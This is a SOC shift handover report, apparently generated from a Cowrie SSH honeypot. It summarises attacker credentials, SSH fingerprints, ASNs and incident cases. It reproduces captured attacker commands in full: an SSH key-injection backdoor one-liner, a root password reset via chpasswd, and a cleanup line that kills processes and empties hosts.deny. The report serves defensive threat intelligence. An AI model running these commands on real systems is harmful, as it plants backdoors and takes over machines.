# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-05-24 |
| **Generated At** | 2026-05-24T19:22:45Z |
| **Shift Time** | 19:22 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **198** |
| Confirmed Threats | **181** |
| False Positives Filtered | **17** (8.6%) |
| Unique Attacker IPs | **21** |
| Countries of Origin | **10** |
| High Severity Cases | **33** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **165** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 4 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **72** |
| Unique Credential Pairs | **39** |
| Unique Usernames | **23** |
| Unique Passwords | **38** |
| Successful Auth Pairs | **21** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 33 |
| `345gs5662d34` | 16 |
| `user` | 2 |
| `intel` | 2 |
| `neo` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `345gs5662d34` | 16 |
| `3245gs5662d34` | 16 |
| `fjbdfdjkdsfs541544@@` | 3 |
| `0000` | 2 |
| `123` | 2 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `345gs5662d34` | `345gs5662d34` | 16 |
| `root` | `3245gs5662d34` | 16 |
| `root` | `fjbdfdjkdsfs541544@@` | 3 |
| `intel` | `123` | 2 |
| `neo` | `neo` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `testing123` | `200.194.181.113` | 2026-05-24T17:19:26 |
| `root` | `3245gs5662d34` | `200.194.181.113` | 2026-05-24T17:19:34 |
| `root` | `Win@2024` | `200.194.181.113` | 2026-05-24T17:23:21 |
| `root` | `fjbdfdjkdsfs541544@@` | `200.194.181.113` | 2026-05-24T17:27:26 |
| `root` | `1324` | `200.194.181.113` | 2026-05-24T17:43:26 |
| `root` | `xitgmLwmp` | `200.194.181.113` | 2026-05-24T17:51:30 |
| `root` | `Server123123` | `183.250.89.44` | 2026-05-24T17:58:42 |
| `root` | `3245gs5662d34` | `183.250.89.44` | 2026-05-24T17:58:47 |
| `root` | `qQ@123456` | `200.194.181.113` | 2026-05-24T17:59:42 |
| `root` | `123@Root` | `118.122.147.49` | 2026-05-24T18:00:58 |
| `root` | `ass` | `200.194.181.113` | 2026-05-24T18:12:02 |
| `root` | `fjbdfdjkdsfs541544@@` | `81.17.101.227` | 2026-05-24T18:29:39 |
| `root` | `3245gs5662d34` | `81.17.101.227` | 2026-05-24T18:29:43 |
| `root` | `Testing2025` | `81.17.101.227` | 2026-05-24T18:34:47 |
| `root` | `fjbdfdjkdsfs541544@@` | `101.47.156.21` | 2026-05-24T18:50:17 |
| `root` | `3245gs5662d34` | `101.47.156.21` | 2026-05-24T18:50:19 |
| `root` | `Q1W2E3R4` | `101.47.156.21` | 2026-05-24T18:54:27 |
| `root` | `123456Dd` | `101.47.156.21` | 2026-05-24T18:58:31 |
| `root` | `Qazxswedc123` | `101.47.156.21` | 2026-05-24T19:02:43 |
| `root` | `soporte` | `101.47.156.21` | 2026-05-24T19:10:55 |
| `root` | `ali123` | `101.47.156.21` | 2026-05-24T19:19:10 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **198** |
| Sessions with Fingerprint | **2** |
| Unique HASSH Fingerprints | **2** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 82 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `f555226df196...` | Mirai/variant | 54 | 6 |
| `03a80b21afa8...` | Modern SSH client | 28 | 2 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `f555226df196...` | libssh | 54 | 6 | Mirai/variant |
| `03a80b21afa8...` | libssh | 28 | 2 | Modern SSH client |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 16 | 4 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:KxZRkiOKAPAG"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `118.122.147.49`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `81.17.101.227`, `183.250.89.44`, `200.194.181.113`, `101.47.156.21`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **21** |
| Unique ASNs | **18** |
| High-Risk ASNs | **15** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS4134` | CHINANET BACKBONE | 2 | HIGH |
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS9541` | Cyber Internet Services (Pvt) Ltd. | 2 | HIGH |
| `AS4811` | China Telecom (Group) | 1 | HIGH |
| `AS45090` | Shenzhen Tencent Computer Systems Company Limited | 1 | HIGH |
| `AS26496` | GoDaddy.com, LLC | 1 | HIGH |
| `AS51167` | Contabo GmbH | 1 | HIGH |
| `AS14061` | DigitalOcean, LLC | 1 | HIGH |

---

---

## 🚨 Priority Cases — Immediate Attention (33)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-0c9265d72b5c

| Field | Detail |
|---|---|
| **Source IP** | `200.194.181[.]113` |
| **First Seen** | 2026-05-24 17:19 |
| **Last Seen** | 2026-05-24 17:19 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 17:19:24` | `cowrie.session.connect` |
| `2026-05-24 17:19:24` | `cowrie.client.version` |
| `2026-05-24 17:19:25` | `cowrie.client.kex` |
| `2026-05-24 17:19:26` | `cowrie.login.success` |
| `2026-05-24 17:19:27` | `cowrie.session.params` |
| `2026-05-24 17:19:27` | `cowrie.command.input` |
| `2026-05-24 17:19:27` | `cowrie.command.failed` |
| `2026-05-24 17:19:28` | `cowrie.log.closed` |
| `2026-05-24 17:19:28` | `cowrie.session.params` |
| `2026-05-24 17:19:28` | `cowrie.command.input` |
| `2026-05-24 17:19:28` | `cowrie.session.file_download` |
| `2026-05-24 17:19:28` | `cowrie.log.closed` |
| `2026-05-24 17:19:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.194.181[.]113` to AbuseIPDB if not already reported
- [ ] Block `200.194.181[.]113` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-23bc07e2d628

| Field | Detail |
|---|---|
| **Source IP** | `200.194.181[.]113` |
| **First Seen** | 2026-05-24 17:19 |
| **Last Seen** | 2026-05-24 17:19 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 17:19:32` | `cowrie.session.connect` |
| `2026-05-24 17:19:32` | `cowrie.client.version` |
| `2026-05-24 17:19:32` | `cowrie.client.kex` |
| `2026-05-24 17:19:34` | `cowrie.login.success` |
| `2026-05-24 17:19:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.194.181[.]113` to AbuseIPDB if not already reported
- [ ] Block `200.194.181[.]113` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea8678a349a6

| Field | Detail |
|---|---|
| **Source IP** | `200.194.181[.]113` |
| **First Seen** | 2026-05-24 17:23 |
| **Last Seen** | 2026-05-24 17:23 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 17:23:20` | `cowrie.session.connect` |
| `2026-05-24 17:23:20` | `cowrie.client.version` |
| `2026-05-24 17:23:20` | `cowrie.client.kex` |
| `2026-05-24 17:23:21` | `cowrie.login.success` |
| `2026-05-24 17:23:22` | `cowrie.session.params` |
| `2026-05-24 17:23:22` | `cowrie.command.input` |
| `2026-05-24 17:23:22` | `cowrie.command.failed` |
| `2026-05-24 17:23:23` | `cowrie.log.closed` |
| `2026-05-24 17:23:23` | `cowrie.session.params` |
| `2026-05-24 17:23:23` | `cowrie.command.input` |
| `2026-05-24 17:23:23` | `cowrie.session.file_download` |
| `2026-05-24 17:23:23` | `cowrie.log.closed` |
| `2026-05-24 17:23:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.194.181[.]113` to AbuseIPDB if not already reported
- [ ] Block `200.194.181[.]113` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a1c6c4552a28

| Field | Detail |
|---|---|
| **Source IP** | `200.194.181[.]113` |
| **First Seen** | 2026-05-24 17:23 |
| **Last Seen** | 2026-05-24 17:23 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 17:23:27` | `cowrie.session.connect` |
| `2026-05-24 17:23:27` | `cowrie.client.version` |
| `2026-05-24 17:23:27` | `cowrie.client.kex` |
| `2026-05-24 17:23:29` | `cowrie.login.success` |
| `2026-05-24 17:23:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.194.181[.]113` to AbuseIPDB if not already reported
- [ ] Block `200.194.181[.]113` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9b0778043ada

| Field | Detail |
|---|---|
| **Source IP** | `200.194.181[.]113` |
| **First Seen** | 2026-05-24 17:27 |
| **Last Seen** | 2026-05-24 17:27 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 17:27:25` | `cowrie.session.connect` |
| `2026-05-24 17:27:25` | `cowrie.client.version` |
| `2026-05-24 17:27:25` | `cowrie.client.kex` |
| `2026-05-24 17:27:26` | `cowrie.login.success` |
| `2026-05-24 17:27:27` | `cowrie.session.params` |
| `2026-05-24 17:27:27` | `cowrie.command.input` |
| `2026-05-24 17:27:27` | `cowrie.command.failed` |
| `2026-05-24 17:27:28` | `cowrie.log.closed` |
| `2026-05-24 17:27:28` | `cowrie.session.params` |
| `2026-05-24 17:27:28` | `cowrie.command.input` |
| `2026-05-24 17:27:29` | `cowrie.session.file_download` |
| `2026-05-24 17:27:29` | `cowrie.log.closed` |
| `2026-05-24 17:27:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.194.181[.]113` to AbuseIPDB if not already reported
- [ ] Block `200.194.181[.]113` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0cc73f9cceb3

| Field | Detail |
|---|---|
| **Source IP** | `200.194.181[.]113` |
| **First Seen** | 2026-05-24 17:27 |
| **Last Seen** | 2026-05-24 17:27 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 17:27:32` | `cowrie.session.connect` |
| `2026-05-24 17:27:32` | `cowrie.client.version` |
| `2026-05-24 17:27:33` | `cowrie.client.kex` |
| `2026-05-24 17:27:34` | `cowrie.login.success` |
| `2026-05-24 17:27:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.194.181[.]113` to AbuseIPDB if not already reported
- [ ] Block `200.194.181[.]113` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2961f7b836cf

| Field | Detail |
|---|---|
| **Source IP** | `200.194.181[.]113` |
| **First Seen** | 2026-05-24 17:43 |
| **Last Seen** | 2026-05-24 17:43 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 17:43:24` | `cowrie.session.connect` |
| `2026-05-24 17:43:24` | `cowrie.client.version` |
| `2026-05-24 17:43:25` | `cowrie.client.kex` |
| `2026-05-24 17:43:26` | `cowrie.login.success` |
| `2026-05-24 17:43:27` | `cowrie.session.params` |
| `2026-05-24 17:43:27` | `cowrie.command.input` |
| `2026-05-24 17:43:27` | `cowrie.command.failed` |
| `2026-05-24 17:43:27` | `cowrie.log.closed` |
| `2026-05-24 17:43:28` | `cowrie.session.params` |
| `2026-05-24 17:43:28` | `cowrie.command.input` |
| `2026-05-24 17:43:28` | `cowrie.session.file_download` |
| `2026-05-24 17:43:28` | `cowrie.log.closed` |
| `2026-05-24 17:43:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.194.181[.]113` to AbuseIPDB if not already reported
- [ ] Block `200.194.181[.]113` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-524be6efc798

| Field | Detail |
|---|---|
| **Source IP** | `200.194.181[.]113` |
| **First Seen** | 2026-05-24 17:43 |
| **Last Seen** | 2026-05-24 17:43 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 17:43:32` | `cowrie.session.connect` |
| `2026-05-24 17:43:32` | `cowrie.client.version` |
| `2026-05-24 17:43:32` | `cowrie.client.kex` |
| `2026-05-24 17:43:33` | `cowrie.login.success` |
| `2026-05-24 17:43:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.194.181[.]113` to AbuseIPDB if not already reported
- [ ] Block `200.194.181[.]113` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76c852f281bb

| Field | Detail |
|---|---|
| **Source IP** | `200.194.181[.]113` |
| **First Seen** | 2026-05-24 17:51 |
| **Last Seen** | 2026-05-24 17:51 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 17:51:28` | `cowrie.session.connect` |
| `2026-05-24 17:51:28` | `cowrie.client.version` |
| `2026-05-24 17:51:29` | `cowrie.client.kex` |
| `2026-05-24 17:51:30` | `cowrie.login.success` |
| `2026-05-24 17:51:31` | `cowrie.session.params` |
| `2026-05-24 17:51:31` | `cowrie.command.input` |
| `2026-05-24 17:51:31` | `cowrie.command.failed` |
| `2026-05-24 17:51:31` | `cowrie.log.closed` |
| `2026-05-24 17:51:32` | `cowrie.session.params` |
| `2026-05-24 17:51:32` | `cowrie.command.input` |
| `2026-05-24 17:51:32` | `cowrie.session.file_download` |
| `2026-05-24 17:51:32` | `cowrie.log.closed` |
| `2026-05-24 17:51:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.194.181[.]113` to AbuseIPDB if not already reported
- [ ] Block `200.194.181[.]113` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5ccf1ec1de7f

| Field | Detail |
|---|---|
| **Source IP** | `200.194.181[.]113` |
| **First Seen** | 2026-05-24 17:51 |
| **Last Seen** | 2026-05-24 17:51 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 17:51:36` | `cowrie.session.connect` |
| `2026-05-24 17:51:36` | `cowrie.client.version` |
| `2026-05-24 17:51:36` | `cowrie.client.kex` |
| `2026-05-24 17:51:37` | `cowrie.login.success` |
| `2026-05-24 17:51:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `200.194.181[.]113` to AbuseIPDB if not already reported
- [ ] Block `200.194.181[.]113` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e26ef93a172

| Field | Detail |
|---|---|
| **Source IP** | `183.250.89[.]44` |
| **First Seen** | 2026-05-24 17:58 |
| **Last Seen** | 2026-05-24 17:58 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 17:58:42` | `cowrie.session.connect` |
| `2026-05-24 17:58:42` | `cowrie.client.version` |
| `2026-05-24 17:58:42` | `cowrie.client.kex` |
| `2026-05-24 17:58:42` | `cowrie.login.success` |
| `2026-05-24 17:58:43` | `cowrie.session.params` |
| `2026-05-24 17:58:43` | `cowrie.command.input` |
| `2026-05-24 17:58:43` | `cowrie.command.failed` |
| `2026-05-24 17:58:43` | `cowrie.log.closed` |
| `2026-05-24 17:58:43` | `cowrie.session.params` |
| `2026-05-24 17:58:43` | `cowrie.command.input` |
| `2026-05-24 17:58:44` | `cowrie.session.file_download` |
| `2026-05-24 17:58:44` | `cowrie.log.closed` |
| `2026-05-24 17:58:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.250.89[.]44` to AbuseIPDB if not already reported
- [ ] Block `183.250.89[.]44` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-48d8b0b955b6

| Field | Detail |
|---|---|
| **Source IP** | `183.250.89[.]44` |
| **First Seen** | 2026-05-24 17:58 |
| **Last Seen** | 2026-05-24 17:58 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-24 17:58:46` | `cowrie.session.connect` |
| `2026-05-24 17:58:46` | `cowrie.client.version` |
| `2026-05-24 17:58:46` | `cowrie.client.kex` |
| `2026-05-24 17:58:47` | `cowrie.login.success` |
| `2026-05-24 17:58:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `183.250.89[.]44` to AbuseIPDB if not already reported
- [ ] Block `183.250.89[.]44` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-49bf9f6c5a03

| Field | Detail |
|---|---|
| **Source IP** | `200.194.181[.]113` |
| **First Seen** | 2026-05-24 17:59 |
| **Last Seen** | 2026-05-24 17:59 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
